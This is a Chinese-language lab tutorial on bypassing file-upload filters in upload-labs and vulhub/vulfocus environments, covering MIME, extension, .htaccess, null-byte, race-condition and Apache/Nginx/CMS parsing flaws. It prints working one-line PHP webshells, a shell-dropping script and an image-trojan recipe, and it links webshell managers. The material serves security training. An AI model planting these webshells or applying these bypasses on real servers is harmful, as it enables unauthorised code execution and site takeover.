class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>将shell.php放入php网站的根目录</p></li><li><p>启动phpstudy</p></li><li><p>访问<a href="http://127.0.0.1/shell.php">phpinfo()</a>，结果显示php版本，代表一句话木马写入成功</p></li><li><p>使用post方式发送请求：1=system(‘whoami’)</p></li></ol><p>​    <img src="/2023/012220963/66.PNG" alt="66"></p><h3 id="文件上传靶场"><a href="#文件上传靶场" class="headerlink" title="文件上传靶场"></a>文件上传靶场</h3><p>upload-labs:<a href="https://github.com/c0ny1/upload-labs">upload-labs</a></p><p>搭建方式：</p><ul><li><p>本地搭建</p><ul><li>phpstudy</li></ul></li><li><p>docker搭建</p><ul><li>~~~dockerfile<br>docker pull tanyiqu/upload-labs:21<br>docker run -d -p 8089:80 tanyiqu/upload-labs:21<pre class="line-numbers language-none"><code class="language-none">ps:一些关卡只能通过Windows搭建实现，一些关卡只能通过Linux搭建实现，因此两种搭建方式都需要。#### Docker安装：[现成工具](https:&#x2F;&#x2F;meq.h5.xeknow.com&#x2F;s&#x2F;1QtIPk)[kali中安装doceker](https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;MeeX9nmUWB9WcsuCUXZnuw)docker管理工具~~~dockerfiledocker pull portainer&#x2F;portainerdocker run -d -p 9000:9000 --name portainer --restart&#x3D;always  -v&#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock -v portainer_data:&#x2F;data portainer&#x2F;portainer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h3><p><a href="https://www.sohu.com/a/461035838_99907709">https://www.sohu.com/a/461035838_99907709</a></p><p>Webshell管理工具非常多，目前主流且常用的有：</p><h4 id="蚁剑-AntSword"><a href="#蚁剑-AntSword" class="headerlink" title="蚁剑(AntSword)"></a>蚁剑(AntSword)</h4><p>Github:<a href="https://github.com/AntSwordProject/">https://github.com/AntSwordProject/</a></p><h4 id="冰蝎-Behinder"><a href="#冰蝎-Behinder" class="headerlink" title="冰蝎(Behinder)"></a>冰蝎(Behinder)</h4><p>Github:<a href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p><h4 id="菜刀-Caidao"><a href="#菜刀-Caidao" class="headerlink" title="菜刀(Caidao)"></a>菜刀(Caidao)</h4><p>官网已经倒了，知道有这么个东西就行</p><h4 id="哥斯拉-Godzilla"><a href="#哥斯拉-Godzilla" class="headerlink" title="哥斯拉(Godzilla)"></a>哥斯拉(Godzilla)</h4><p>Github:<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><h3 id="文件上传前端绕过"><a href="#文件上传前端绕过" class="headerlink" title="文件上传前端绕过"></a>文件上传前端绕过</h3><p>环境：uplo-labs靶场 Windows&amp;Linux</p><p>关卡：Pass-01</p><p>此关卡中，网站只在客户端（浏览器）进行文件的验证。</p><ol><li>上传一个shell.php扩展名的文件，显示文件不允许上传，同时显示扩展名白名单</li></ol><p><img src="/2023/012220963/67.PNG" alt="67"></p><ol start="2"><li>分析html中源码，在上传中发现存在一个JS验证</li></ol><p><img src="/2023/012220963/68.PNG" alt="68"></p><ol start="3"><li>删除JS验证，重新上传shell.php，发现上传成功</li></ol><p><img src="/2023/012220963/69.PNG" alt="69"></p><p>在新的标签页打开上传的图片，显示php代码被解析，成功！！！</p><p><img src="/2023/012220963/70.PNG" alt="70"></p><h3 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h3><p>JSP环境：</p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull tanyiqu&#x2F;demo-upload:simple_jspdocker run -d -p 8089:8080 tanyiqu&#x2F;demo-upload:simple_jsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol><li>打开蚁剑，随便添加一条数据，选中，点击上方的生成shell,选择jsp格式生成（上方的shell生成小工具是插件，可以自行查找添加）</li></ol><p><img src="/2023/012220963/71.PNG" alt="71"></p><ol start="2"><li>上传之后链接，显示白屏，成功</li></ol><p><img src="/2023/012220963/72.PNG" alt="72"></p><ol start="3"><li>蚁剑连接成功</li></ol><p><img src="/2023/012220963/73.PNG" alt="73"></p><h2 id="文件上传黑名单绕过"><a href="#文件上传黑名单绕过" class="headerlink" title="文件上传黑名单绕过"></a>文件上传黑名单绕过</h2><h3 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h3><p>搭建好upload-labs靶场，无论是哪种绕过，首先代码审计，判断黑白名单</p><h3 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h3><p>黑名单：黑名单是一个列表，在黑名单列表里面记录的内容（人、手机号、ip等）或被限制或禁止执行一些操作。</p><p>白名单：白名单与黑名单相对，也是一个列表，只有在白名单列表里的内容（人、手机号、ip等）才可以执行一些操作，不在白名单记录的内容（人、手机号、ip等）则会被禁止执行操作。</p><p>文件上传漏洞黑名单：</p><p>某些网站禁止用户上传扩展名为 .asp .php .aspx .jsp 的文件， .asp .php .aspx .jsp 这个列表就叫做黑名单。</p><p>文件上传漏洞白名单：</p><p>某些网站只允许用户上传扩展名为 .png .jpg .gif 的文件， .png .jpg .gif 这个列表就叫做白名单。</p><h3 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>MIME：（Multipurpose Internet Mail Extensions），MIME是一种标准，用来表示文档、文件或字节流的性质和格式。</p><p>常见的MIME：</p><p><img src="/2023/012220963/74.PNG" alt="74"></p><p>服务器在检测上传的图片时，可能会检测文件的MIME类型。</p><p>此类检测可以通过修改MIME进行绕过</p><h4 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 Windows&amp;Linux</p><p>工具：Burpsuit</p><p>关卡：Pass-02</p><p>此关卡中，网站服务端检测 Content-Type （MIME）内容。</p><ol><li><p>开启代理和bp拦截</p></li><li><p>选择一个PHP文件上传</p></li><li><p>修改http包中的 Content-Type 为 image/png(如果害怕格式不对，可以先上传一个正确的格式复制，之后再去改上传php文件时的格式)</p></li></ol><ul><li>先上传白名单图片</li></ul><p><img src="/2023/012220963/75.PNG" alt="75"></p><ul><li>在上传不是白名单的图片，修改Content-Type</li></ul><p><img src="/2023/012220963/76.PNG" alt="76"></p><ol start="4"><li>上传成功</li></ol><p><img src="/2023/012220963/77.PNG" alt="77"></p><h3 id="特殊扩展名绕过"><a href="#特殊扩展名绕过" class="headerlink" title="特殊扩展名绕过"></a>特殊扩展名绕过</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>由于历史原因，部分解释器可能支持符合正则 /ph(p[2-7]?|t(ml)?)/ 的后缀，如 php / php5 / pht / phtml / shtml / pwml / phtm 等 可在禁止上传php文件时测试该类型。</p><h4 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-03</p><p>此关卡中，网站只过滤 .asp|.aspx|.php|.jsp 后缀文件。</p><ol><li><p>将木马php文件扩展名改成 .phtml</p></li><li><p>直接上传 .phtml 文件</p></li><li><p>上传成功后访问</p></li></ol><h3 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title="htaccess绕过"></a>htaccess绕过</h3><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>.htaccess文件 (或者“分布式配置文件”）,全称是 Hypertext Access(超文本入口)。</p><p>提供了针对目录改变配置的方法，即在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 Apache的AllowOverride指令来设置。</p><p><strong>.htaccess</strong>在文件上传中最大作用就是 可以使任何类型文件作为 php解析，该文件在 Apache里默认是启用的。</p><h4 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-04</p><p>此关卡中，网站过滤黑名单中没有 .htaccess。</p><ol><li>准备一个 a.htaccess 文件，内容如下：</li></ol><pre class="line-numbers language-python" data-language="python"><code class="language-python">SetHandler application<span class="token operator">/</span>x<span class="token operator">-</span>httpd<span class="token operator">-</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>使用bp抓包上传 a.htaccess，并在上传时将名称改成 .htaccess</li></ol><p><img src="/2023/012220963/78.PNG" alt="78"></p><ol start="2"><li>将php木马修改名称，改成随意的扩展名，如 shell.ppp，并直接上传</li><li>访问 shell.ppp，解析成功</li></ol><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>网站在过滤扩展名时，如果没有将字符串统一大小写后再进行比较的话，可以通过修改扩展名大小写的方式绕过。</p><h4 id="演示-3"><a href="#演示-3" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-06</p><p>此关卡中，网站过滤黑名单没有验证大小写。</p><ol><li><p>将php的木马，修改扩展名为 phP</p></li><li><p>上传此文件，直接解析成功</p></li></ol><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><h4 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h4><p>在Windows中，文件首位如果有空格，系统会默认去除。</p><p>如：”example.php “ 文件会被修改成：”example.php”</p><p>但是在服务器字符串匹配时，”.php “ 与 “.php”匹配不成功，即可绕过。</p><h4 id="演示-4"><a href="#演示-4" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-07</p><p>此关卡中，网站过滤黑名单没有去除首尾空格。</p><ol><li><p>上传php木马，使用bp抓包</p></li><li><p>修改文件名，在某尾加上一些空格</p></li></ol><p><img src="/2023/012220963/79.PNG" alt="79"></p><ol start="3"><li>解析成功</li></ol><h3 id="点号绕过"><a href="#点号绕过" class="headerlink" title="点号绕过"></a>点号绕过</h3><h4 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h4><p>在windows中，文件名最末尾的 点不会被解析</p><h4 id="演示-5"><a href="#演示-5" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-08</p><p>此关卡中，网站过滤黑名单没有去除末尾的点。</p><ol><li><p>上传php木马，使用bp抓包</p></li><li><p>修改文件名，在某尾加上一个点</p></li><li><p>解析成功</p></li></ol><h3 id="点-空格-点绕过"><a href="#点-空格-点绕过" class="headerlink" title="点+空格+点绕过"></a>点+空格+点绕过</h3><h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p>PHP中的 deldot()函数会删除字符串中的点，但是该函数检测到末尾的第一个点之后，会删除，并且继续检测。如果遇到空格则会停止删除。构造 点 空格 点 即可进行绕过</p><h4 id="演示-6"><a href="#演示-6" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-10</p><p>此关卡中，网站过滤黑名单使用deldot()函数删除末尾的点。</p><ol><li><p>上传php木马，使用bp抓包</p></li><li><p>修改文件名，在某尾加上 点 空格 点</p></li></ol><p><img src="/2023/012220963/80.PNG" alt="80"></p><ol start="3"><li>解析成功</li></ol><h3 id="特殊字符-DATA绕过"><a href="#特殊字符-DATA绕过" class="headerlink" title="特殊字符:$DATA绕过"></a>特殊字符:$DATA绕过</h3><h4 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4><p>在 window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名他的目的就是不检查后缀名。</p><p>如：a.php::$DATA 与 a.php 等价</p><h4 id="演示-7"><a href="#演示-7" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-09</p><p>此关卡中，网站过滤黑名单没有检测::$DATA。</p><ol><li><p>上传php木马，使用bp抓包</p></li><li><p>修改文件名，在某尾加上 ::$DATA</p></li></ol><p><img src="/2023/012220963/81.PNG" alt="81"></p><ol start="3"><li>上传成功，在访问时去除::$DATA即可</li></ol><p><img src="/2023/012220963/82.PNG" alt="82"></p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><h4 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4><p>PHP中 str_ireplace(find,replace,string,count) 函数替换字符串中的一些字符（不区分大小写）且只能去除一次。</p><p>如果后端服务器在验证扩展名时，没有递归替换扩展名的话，可以使用双写扩展名的方式进行绕过。</p><h4 id="演示-8"><a href="#演示-8" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong>&amp;<strong>Linux</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-11</p><p>此关卡中，网站过滤黑名单没有递归删除扩展名。</p><ol><li><p>上传php木马，使用bp抓包</p></li><li><p>修改文件名扩展名，改为 .pphphp</p></li></ol><p><img src="/2023/012220963/83.PNG" alt="83"></p><ol start="3"><li>上传成功，并且可直接访问解析</li></ol><p><strong>注意</strong>：不要改成 <strong>php</strong>hpp，否则会被替换后扩展名会变成 hpp</p><h3 id="00截断-GET"><a href="#00截断-GET" class="headerlink" title="00截断-GET"></a>00截断-GET</h3><h4 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h4><p>php的一些函数的底层是 C语言，C语言的字符串中，如果遇到0x00会被编译器认为是字符串结束标志，会把该字符串截断。0x表示 16进制，URL中%00解码成 16进制就是 0x00。可以构造名字带有%00木马上传，进行绕过</p><h4 id="演示-9"><a href="#演示-9" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-12</p><p>必要配置：</p><ul><li><p>php 版本 &lt;5.3.4 才可以进行00截断</p></li><li><p>magic_quotes_gpc = Off（改文件在php.ini配置文件中）</p></li></ul><ol><li>上传php木马，使用bp抓包</li><li>修改 save_path=../upload/shell.php%00 、 filename=a.png</li></ol><p><img src="/2023/012220963/84.PNG" alt="84"></p><ol start="3"><li>访问 shell.php即可</li></ol><h3 id="00截断-POST"><a href="#00截断-POST" class="headerlink" title="00截断-POST"></a>00截断-POST</h3><h4 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h4><p>原理同GET方式，只不过传参方式为POST</p><h4 id="演示-10"><a href="#演示-10" class="headerlink" title="演示"></a>演示</h4><p>环境：uplo-labs靶场 <strong>Windows</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-13</p><p>必要配置：</p><ul><li><p>php 版本 &lt;5.3.4 才可以进行00截断</p></li><li><p>magic_quotes_gpc = Off（改文件在php.ini配置文件中）</p></li></ul><ol><li><p>上传php木马，使用bp抓包</p></li><li><p>修改 ../upload/shell.php.png filename=shell.png</p></li></ol><p><img src="/2023/012220963/85.PNG" alt="85"></p><ol start="3"><li>添加%00</li></ol><p>​    在光标位置输入一个空格，并选中它，在右边改为00</p><p><img src="/2023/012220963/86.PNG" alt="86"></p><ol start="4"><li>上传成功，访问 shell.php即可</li></ol><h2 id="文件上传-图片马及文件解析漏洞利用"><a href="#文件上传-图片马及文件解析漏洞利用" class="headerlink" title="文件上传-图片马及文件解析漏洞利用"></a>文件上传-图片马及文件解析漏洞利用</h2><h3 id="图片马的制作与利用"><a href="#图片马的制作与利用" class="headerlink" title="图片马的制作与利用"></a>图片马的制作与利用</h3><h4 id="图片马"><a href="#图片马" class="headerlink" title="图片马"></a>图片马</h4><p>图片马就是在图片中隐藏一句话木马，使用正常的图片上传功能将该图片马上传至服务器后，再利用htaccess、文件包含漏洞或者解析漏洞即可发挥作用。</p><p>注：单纯的上传图片马并不会发挥作用，必须配合其他漏洞。</p><h4 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h4><p>注意事项：</p><ul><li><p>图片大小不宜过大</p></li><li><p>尽量为一句话木马</p></li></ul><p>制作命令：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">copy <span class="token number">1.</span>jpg<span class="token operator">/</span>b <span class="token operator">+</span> <span class="token number">2.</span>php<span class="token operator">/</span>a <span class="token number">3.</span>jpg <span class="token comment"># b-->二进制;a-->ascii,图片可加绝对路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/87.PNG" alt="87"></p><h4 id="图片马绕过"><a href="#图片马绕过" class="headerlink" title="图片马绕过"></a>图片马绕过</h4><p>环境：uplo-labs靶场 <strong>Linux</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-14</p><p>此关卡中，网站检查图标内容开头2个字节！</p><ol><li><p>将木马直接上传</p></li><li><p>上传成功后访问</p></li></ol><p>​        <a href="http://192.168.111.136:8089/include.php?file=upload/5820230314052947.jpg">phpinfo()</a></p><p>其中：upload/5820230314052947.jpg，将上传的文件在新的标签页中打开，url中存在该链接</p><h4 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h4><p>条件竞争是代码逻辑存在问题，代码执行逻辑为：服务器先将上传的文件保存在临时目录中，然后再对后缀名进行白名单验证。如果符合白名单的要求，并重命名，但如果不符合白名单的要求，就会被删除掉。</p><p>代码删除文件是需要耗费时间的，如果我们能够在文件被删除之前就访问到了此文件，那么即使删除了也无所谓。这个过程就叫做条件竞争。</p><p>环境：upload-labs靶场 <strong>Linux</strong></p><p>工具：Burpsuit</p><p>关卡：Pass-18，17关也可以</p><ol><li>分析代码</li></ol><p>​        服务器先将上传的文件保存下来，然后通过白名单进行比较。如果为jpg、png、gif中的一种，就将文件进行重命名，如果不符合则删除该文件。</p><ol start="2"><li>准备php特殊马(写入马)</li></ol><p>shell.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li>准备批量访问脚本</li></ol><p>test1.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://ip:端口/upload/shell.php"</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li>上传shell.php，进行抓包，将抓到的包发给Intruder模块</li><li>设置payload</li></ol><p><img src="/2023/012220963/89.PNG" alt="89"></p><ol start="6"><li><p><strong>执行</strong>python脚本，<strong>开启</strong>burp爆破(存在先后顺序)</p></li><li><p>访问链接：<a href="http://ip:端口/upload/a.php">http://ip:端口/upload/a.php</a></p></li></ol><p>如果出现 phpinfo页面，则说明条件竞争执行成功，退出脚本和爆破</p><ol start="8"><li>使用antsword链接一句话木马即可</li></ol><h3 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用"></a>文件解析漏洞利用</h3><h4 id="Apache-HTTPD解析漏洞"><a href="#Apache-HTTPD解析漏洞" class="headerlink" title="Apache HTTPD解析漏洞"></a>Apache HTTPD解析漏洞</h4><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。</p><p>在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。</p><p>如：a.php.jpg 文件会被当成 php文件执行</p><p>利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p><h5 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>docker镜像：vulfocus/httpd-apache_parsing_vulnerability:latest</p><p>启动环境：</p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">docker pull vulfocus&#x2F;httpd-apache_parsing_vulnerability:latestdocker run -d -p 8081:80 vulfocus&#x2F;httpd-apache_parsing_vulnerability:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>创建一个名为：a.php.jpg的图片</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用普通的方式上传上去，访问即可</p><p>http//ip:端口/uploadfiles/a.php.jpg(我的地址)</p><h4 id="Nginx解析漏洞-未成功"><a href="#Nginx解析漏洞-未成功" class="headerlink" title="Nginx解析漏洞(未成功)"></a>Nginx解析漏洞(未成功)</h4><p>影响版本：</p><p>nginx 1.x</p><p>php 7.x</p><h5 id="漏洞环境-1"><a href="#漏洞环境-1" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>Vulhub：<a href="https://vulhub.org/">https://vulhub.org/</a></p><p>vulhub：nginx/nginx_parsing_vulnerability</p><p>启动环境：docker-compose up -d</p><ul><li><p>制作图片马</p></li><li><p>上传图片马，保存路径</p><p>访问图片的地址，在地址的后面加上 /.php</p></li></ul><p>漏洞查找</p><p>搜索引擎：inurl:php</p><p>找到访问网站，在后面添加 /.php 测试即可</p><h4 id="Apache-CVE-2017-15715"><a href="#Apache-CVE-2017-15715" class="headerlink" title="Apache CVE-2017-15715"></a>Apache CVE-2017-15715</h4><p>Apache换行解析漏洞 。于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略。</p><p>影响版本：2.4.0 ~ 2.4.29</p><h5 id="漏洞环境-2"><a href="#漏洞环境-2" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>vulhub：httpd/CVE-2017-15715</p><p>启动环境：docker-compose up -d</p><p>上传1.php文件，并且拦截，发送至重发器</p><p>在重发器中，将文件名改成 a.php**%0a**</p><p><strong>0a</strong>要使用16进制的方式添加进去</p><p><img src="/2023/012220963/90.PNG" alt="90"></p><p>之后把包发送出去，返回值 200</p><p>访问 /evil.php%0a 即可解析成功</p><p><img src="/2023/012220963/91.PNG" alt="91"></p><h4 id="Nginx-CVE-2013-4547"><a href="#Nginx-CVE-2013-4547" class="headerlink" title="Nginx CVE-2013-4547"></a>Nginx CVE-2013-4547</h4><p>Nginx文件名逻辑解析漏洞</p><p>Nginx错误地解析了请求的URL,错误地获取到用户请求的文件名,导致出现权限绕过、代码执行的连带影响。</p><p>上传名为 a.jpg 的PHP文件，抓包后在文件名称末尾拼接 16进制的 0x20 0x00 即可解析</p><p>影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</p><h5 id="漏洞环境-3"><a href="#漏洞环境-3" class="headerlink" title="漏洞环境"></a>漏洞环境</h5><p>vulhub：nginx/CVE-2013-4547</p><p>启动环境：docker-compose up -d</p><p>上传一个 c.jpg 文件，抓包修改文件名，后面加上空格，内容如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再抓一个访问index的GET方式的包，访问 /uploadfiles/c.jpg[0x20][0x00].php 即可</p><p>0x20 和 0x00 为16进制</p><p><img src="/2023/012220963/92.PNG" alt="92"></p><p>真实利用时，可以使用PHP代码写入一个木马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_POST[1]); phpinfo(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="大马分享"><a href="#大马分享" class="headerlink" title="大马分享"></a>大马分享</h3><p><a href="https://github.com/tennc/webshell">https://github.com/tennc/webshell</a></p><h2 id="CMS漏洞测试练习"><a href="#CMS漏洞测试练习" class="headerlink" title="CMS漏洞测试练习"></a>CMS漏洞测试练习</h2><h3 id="CVE-2019-8933-dedecms文件上传"><a href="#CVE-2019-8933-dedecms文件上传" class="headerlink" title="CVE-2019-8933 dedecms文件上传"></a>CVE-2019-8933 dedecms文件上传</h3><p>DedeCMS 5.7SP2版本中存在安全漏洞。远程攻击者可通过在添加新模板时，将文件名../index.html更改成../index.php利用该漏洞向uploads/目录上传.php文件并执行该文件。</p><p>影响版本：DedeCMS 5.7SP2</p><h4 id="漏洞环境-4"><a href="#漏洞环境-4" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/dedecms-cve_2019_8933:latest</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>dedecms<span class="token operator">-</span>cve_2019_8933<span class="token punctuation">:</span>latestdocker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8081</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>dedecms<span class="token operator">-</span>cve_2019_8933<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>后台路径：/uploads/dede/ 后台密码：admin:admin</p><p>模板=&gt;默认模板管理=&gt;新建模板</p><p><img src="/2023/012220963/93.png" alt="93"></p><p>在新建模板中写入一句话木马，并保存最为.htm格式</p><p>之后进行一下操作：</p><p><img src="/2023/012220963/94.png" alt="94"></p><p>即上传完成，可以点击浏览查看效果，之后可以使用webshell工具进行连接。</p><h3 id="CVE-2020-13384-Monstra文件上传"><a href="#CVE-2020-13384-Monstra文件上传" class="headerlink" title="CVE-2020-13384 Monstra文件上传"></a>CVE-2020-13384 Monstra文件上传</h3><h4 id="漏洞环境-5"><a href="#漏洞环境-5" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><p>环境：vulfocus/monstra_cve_2020_13384:latest</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">docker pull vulfocus<span class="token operator">/</span>monstra_cve_2020_13384<span class="token punctuation">:</span>latestdocker run <span class="token operator">-</span>d <span class="token operator">-</span>p <span class="token number">8080</span><span class="token punctuation">:</span><span class="token number">80</span> vulfocus<span class="token operator">/</span>monstra_cve_2020_13384<span class="token punctuation">:</span>latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol><li><p>初始化环境</p></li><li><p>登录管理员页面，找到文件上传页面</p></li></ol><p>​    <a href="http://ip:端口号/admin/index.php?id=filesmanager(我的文件上传地址)">http://ip:端口号/admin/index.php?id=filesmanager(我的文件上传地址)</a></p><ol start="3"><li>准备一个php木马文件，选择并上传</li><li>点击上传时，提示文件类型不允许上传</li><li>多次测试文件扩展名，最终确定 .phar 可以上传</li><li>上传 phar的php木马</li><li>访问该文件，文件上传成功</li></ol><p>​    <a href="http://ip:端口号/public/uploads/a.phar">http://ip:端口号/public/uploads/a.phar</a></p><ol start="8"><li>将文件内容修改为一句话木马，即可使用Webshell管理工具进行管理</li></ol><p><strong>如何批量测试扩展名是否不在黑名单内？</strong></p><p>​    抓上传页面的包，之后把包放入Inturder,之后选中扩展名进行爆破即可</p><p><img src="/2023/012220963/95.PNG" alt="95"></p><p><strong>推荐扩展名爆破脚本</strong></p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts"> Fuzz 字典</a></p><h3 